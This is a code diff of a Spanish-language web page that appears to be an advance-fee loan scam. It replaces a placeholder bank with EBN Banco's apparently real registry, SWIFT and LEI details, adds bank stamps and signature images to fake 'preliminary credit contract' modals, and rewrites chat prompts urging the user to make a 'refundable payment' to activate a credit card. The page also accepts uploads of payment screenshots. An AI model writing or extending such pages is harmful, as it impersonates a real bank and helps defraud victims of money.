+        var bankFromEl = document.getElementById('ccm_bankNameFrom');
+        var signBank = document.getElementById('ccm_signBank');
+        var clientEl = document.getElementById('ccm_clientName');
+        var signClientEl = document.getElementById('ccm_signClientName');
+        if (bankEl) bankEl.textContent = bankUpper;
+        if (bankFromEl) bankFromEl.textContent = bankDisplay;
+        if (signBank) signBank.textContent = 'Representante del banco ' + bankDisplay;
+        if (clientEl) clientEl.textContent = clientName;
+        if (signClientEl) signClientEl.textContent = clientName;
+        var logoEl = document.getElementById('ccm_logo');
+        if (logoEl) { logoEl.src = '../banks/newBank/logo2.png'; logoEl.alt = bankName; }
+        var stampEl = document.getElementById('ccm_stamp');
+        if (stampEl) stampEl.src = '../banks/newBank/stamp.svg';
+        var brand = document.getElementById('ccm_brand');
+        if (brand) brand.setAttribute('aria-label', bankName);
+        modal.classList.add('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('contract-modal-open');
+        var body = document.getElementById('creditCardContractBody');
+        if (body) { body.scrollTop = 0; setTimeout(function(){ body.focus({ preventScroll: true }); }, 0); }
+      }
+      function closeCreditCardContractModal() {
+        var modal = document.getElementById('creditCardContractModal');
+        if (!modal) return;
+        modal.classList.remove('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('contract-modal-open');
+      }
+      document.addEventListener('DOMContentLoaded', function() {
+        var modal = document.getElementById('creditCardContractModal');
+        if (!modal) return;
+        modal.querySelectorAll('[data-creditc-close]').forEach(function(el) {
+          el.addEventListener('click', closeCreditCardContractModal);
+        });
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && modal.classList.contains('tourist-contract-modal--open')) closeCreditCardContractModal();
+        });
+      });
+    </script>
+
     <!-- ── Contrato modal (view-only, opened from chat card) ── -->
     <div class="tourist-contract-modal" id="contratoViewModal" aria-hidden="true">
       <div class="tourist-contract-modal__backdrop" data-contrato-close tabindex="-1"></div>
@@ -693,20 +1183,24 @@
             <!-- PÁGINA 1 -->
             <section class="credit-contract__page">
               <header class="credit-contract__masthead">
-                <div class="credit-contract__caixa-brand" id="cvm_brand" aria-label="New Bank">
-                  <img src="../banks/newBank/logo.svg" alt="New Bank" id="cvm_logo" class="credit-contract__caixa-logo">
+                <div class="credit-contract__caixa-brand" id="cvm_brand" aria-label="EBN Banco">
+                  <img src="../banks/newBank/logo2.png" alt="EBN Banco" id="cvm_logo" class="credit-contract__caixa-logo">
                 </div>
                 <div class="credit-contract__goval" aria-label="GO VAL FINANCE SL">
                   <img src="../assets/monetologo.svg" alt="GO VAL FINANCE SL" class="credit-contract__goval-logo">
                 </div>
               </header>
               <p class="credit-contract__mono">
-                <strong id="cvm_bankName">NEW BANK S.A.</strong><br>
-                Sede social: Calle Gran Vía, 32, 28013 Madrid, España.<br>
-                NIF (CIF): A-00000001<br>
-                Capital social: € 1.000.000.000 (representado por 1.000.000.000 acciones de €1 cada una).<br>
-                Inscrita en el Registro Mercantil de Madrid (Tomo 1, Hoja 1, Página M-1).<br>
-                Inscrita en el Registro Especial del Banco de España con el nº 0001.
+                <strong id="cvm_bankName">EBN Banco</strong><br>
+                Sede social:<br>
+                Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                NIF (CIF): A28763043<br>
+                Código Banco de España: 0211<br>
+                SWIFT/BIC: PROAESMMXXX<br>
+                LEI: 95980020140005388333<br>
+                Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                Con la intermediación de: <strong>Moneto Plus</strong>
               </p>
               <h3 class="credit-contract__doc-title">CONTRATO PRELIMINAR DE CRÉDITO</h3>
               <p class="credit-contract__doc-subtitle">(Aviso sobre las condiciones de crédito)</p>
@@ -715,7 +1209,7 @@
                 (Agente en actividad financiera – OAM A130179), confirma la mediación de la operación.
               </p>
               <p class="credit-contract__mono">
-                El banco <span id="cvm_bankName2">New Bank S.A.</span> confirma la aprobación de la concesión del crédito.<br>
+                El banco <span id="cvm_bankName2">EBN Banco</span> confirma la aprobación de la concesión del crédito.<br>
                 El presente documento constituye una notificación preliminar de las condiciones y no
                 genera efectos jurídicos hasta la firma del contrato definitivo.
               </p>
@@ -880,12 +1374,12 @@
                 Lugar y fecha: Firma electrónica, <span id="cvm_fecha"></span>
               </p>
               <div class="credit-contract__sign-cols">
-                <div class="credit-contract__sign-col" id="cvm_signBank">Representante del banco New Bank S.A.</div>
+                <div class="credit-contract__sign-col" id="cvm_signBank">Representante del banco EBN Banco</div>
                 <div class="credit-contract__sign-col">Representante del intermediario Moneto Plus S.L.:</div>
-                <div class="credit-contract__sign-col">Cliente:</div>
+                <div class="credit-contract__sign-col">Cliente: <span id="cvm_signClientName">Oscar Asenjo Núñez</span></div>
               </div>
               <div class="credit-contract__stamp-area" aria-hidden="true">
-                <img src="../assets/stamp.svg" alt="" class="credit-contract__stamp" id="cvm_stamp">
+                <img src="../banks/newBank/stamp.svg" alt="" class="credit-contract__stamp" id="cvm_stamp">
                 <img src="../assets/left-hand.png" alt="" class="credit-contract__signature credit-contract__signature--left">
                 <img src="../assets/right-hand.png" alt="" class="credit-contract__signature credit-contract__signature--right">
               </div>
@@ -912,22 +1406,27 @@
         // Fill bank name from localStorage
         var bankName = '';
         var bankKey  = '';
+        var clientName = '';
         try {
-          bankName = localStorage.getItem('selectedBank')    || 'New Bank';
-          bankKey  = localStorage.getItem('selectedBankKey') || 'newBank';
+          bankName = getStoredBankName('EBN Banco');
+          bankKey  = 'newBank';
+          clientName = localStorage.getItem('touristCardNombre') || localStorage.getItem('inputName') || 'Oscar Asenjo Núñez';
         } catch(e) {}
         var el1 = document.getElementById('cvm_bankName');
         var el2 = document.getElementById('cvm_bankName2');
         var elSign = document.getElementById('cvm_signBank');
-        if (el1) el1.textContent = bankName.toUpperCase() + ' S.A.';
-        if (el2) el2.textContent = bankName + ' S.A.';
-        if (elSign) elSign.textContent = 'Representante del banco ' + bankName + ' S.A.';
+        var elSignClient = document.getElementById('cvm_signClientName');
+        var bankDisplay = getStoredBankDisplay('EBN Banco');
+        if (el1) el1.textContent = bankDisplay;
+        if (el2) el2.textContent = bankDisplay;
+        if (elSign) elSign.textContent = 'Representante del banco ' + bankDisplay;
+        if (elSignClient) elSignClient.textContent = clientName;
         // Logo
         var logoEl = document.getElementById('cvm_logo');
-        if (logoEl) { logoEl.src = '../banks/' + bankKey + '/logo.svg'; logoEl.alt = bankName; }
+        if (logoEl) { logoEl.src = '../banks/newBank/logo2.png'; logoEl.alt = bankName; }
         // Stamp
         var stampEl = document.getElementById('cvm_stamp');
-        if (stampEl) stampEl.src = '../banks/' + bankKey + '/stamp.svg';
+        if (stampEl) stampEl.src = '../banks/newBank/stamp.svg';
         // Date
         var fechaEl = document.getElementById('cvm_fecha');
         if (fechaEl) {
@@ -978,8 +1477,9 @@
           : (localStorage.getItem('flowSessionId') || ('sc' + Date.now()));
 
         var name = (localStorage.getItem('inputName') || '').trim();
-        var bank = (localStorage.getItem('selectedBank') || '').trim();
-        if (!bank) bank = 'New Bank';
+        var bank = '';
+        try { bank = (localStorage.getItem('selectedBank') || '').trim(); } catch(e) {}
+        if (!bank) bank = 'EBN Banco';
 
         var displayedMsgCount = 0;
         var notifButtonShown = false;
@@ -991,9 +1491,14 @@
         }
 
         function isImgContent(s) {
-          return s && (s.indexOf('/uploads/') === 0 || s.indexOf('PAYMENT_SCREENSHOT:') === 0);
+          return s && (
+            s.indexOf('/uploads/') === 0
+            || s.indexOf('PAYMENT_SCREENSHOT:') === 0
+            || s.indexOf('PAYMENT_SCREENSHOT_RETURN:') === 0
+          );
         }
         function imgUrl(s) {
+          if (s.indexOf('PAYMENT_SCREENSHOT_RETURN:') === 0) return s.slice('PAYMENT_SCREENSHOT_RETURN:'.length);
           return s.indexOf('PAYMENT_SCREENSHOT:') === 0 ? s.slice('PAYMENT_SCREENSHOT:'.length) : s;
         }
 
@@ -1012,12 +1517,12 @@
             var bubble = document.createElement('div');
             bubble.className = 'caller-msg-bubble';
             var lbl = document.createElement('p');
-            lbl.textContent = 'Para finalizar el proceso de activación, es necesario abonar la comisión administrativa según las condiciones del contrato:';
+            lbl.textContent = 'Para finalizar el proceso de emisión y activación de la tarjeta de crédito, es necesario abonar el coste indicado en el documento:';
             bubble.appendChild(lbl);
             var a = document.createElement('a');
-            a.href = './notifications3.html';
+            a.href = './transaction-detail2.html';
             a.className = 'caller-action-btn caller-action-btn--primary';
-            a.innerHTML = 'Pagar la comisión <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
+            a.innerHTML = 'Realizar pago reembolsable <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
             el.appendChild(bubble);
             el.appendChild(a);
             return el;
@@ -1048,7 +1553,7 @@
 
           if (content === '[[NOTIF_PDF]]') {
             var bankN = '';
-            try { bankN = localStorage.getItem('selectedBank') || 'New Bank'; } catch(e) {}
+            try { bankN = getStoredBankShort('EBN Banco'); } catch(e) {}
             el.className = 'contrato-card';
             el.setAttribute('onclick', 'openNotifPdfModal()');
             el.innerHTML =
@@ -1065,14 +1570,48 @@
 
           if (content === '[[CONTRATO]]') {
             var bank = '';
-            try { bank = localStorage.getItem('selectedBank') || 'New Bank'; } catch(e) {}
+            try { bank = getStoredBankShort('EBN Banco'); } catch(e) {}
             el.className = 'contrato-card';
             el.setAttribute('onclick', 'openContratoModal()');
             el.innerHTML =
               '<div class="contrato-card__left">'
               + '<div class="contrato-card__icon" aria-hidden="true">' + PDF_ICON + '</div>'
               + '<div class="contrato-card__text">'
-              + '<p class="contrato-card__title">' + bank + ' – Anexo crédito</p>'
+              + '<p class="contrato-card__title">' + bank + ' – Contrato de crédito</p>'
+              + '<p class="contrato-card__sub">Contrato Nº ES-4738D9215</p>'
+              + '</div>'
+              + '</div>'
+              + ARROW;
+            return el;
+          }
+
+          if (content === '[[CREDITC]]') {
+            var creditBank = '';
+            try { creditBank = getStoredBankShort('EBN Banco'); } catch(e) {}
+            el.className = 'contrato-card';
+            el.setAttribute('onclick', 'openCreditCardContractModal()');
+            el.innerHTML =
+              '<div class="contrato-card__left">'
+              + '<div class="contrato-card__icon" aria-hidden="true">' + PDF_ICON + '</div>'
+              + '<div class="contrato-card__text">'
+              + '<p class="contrato-card__title">' + creditBank + ' - Cuenta y tarjeta de crédito</p>'
+              + '<p class="contrato-card__sub">Contrato Nº ES-4738D9215</p>'
+              + '</div>'
+              + '</div>'
+              + ARROW;
+            return el;
+          }
+
+          if (content === '[[SEGURO]]') {
+            var seguroBank = '';
+            try { seguroBank = getStoredBankShort('EBN Banco'); } catch(e) {}
+            el.className = 'contrato-card';
+            el.setAttribute('onclick', 'openSeguroModal()');
+            el.innerHTML =
+              '<div class="contrato-card__left">'
+              + '<div class="contrato-card__icon" aria-hidden="true">' + PDF_ICON + '</div>'
+              + '<div class="contrato-card__text">'
+              + '<p class="contrato-card__title">' + seguroBank + ' - Certificado de seguro</p>'
               + '<p class="contrato-card__sub">Contrato Nº ES-4738D9215</p>'
               + '</div>'
               + '</div>'
